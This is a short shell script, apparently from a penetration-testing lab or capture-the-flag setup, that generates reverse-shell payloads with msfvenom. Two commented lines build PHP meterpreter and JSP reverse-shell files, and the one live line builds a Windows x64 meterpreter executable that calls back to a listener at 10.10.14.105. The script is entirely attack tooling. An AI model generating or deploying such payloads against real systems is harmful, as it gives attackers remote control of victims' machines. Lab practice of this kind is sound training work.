#!/bin/sh
echo "Generating payload..."
# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=4446 > help4446.php
# msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.105 lport=4446 -f raw > arctic4446.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.105 lport=4448 -f exe > rtcp4448.exe
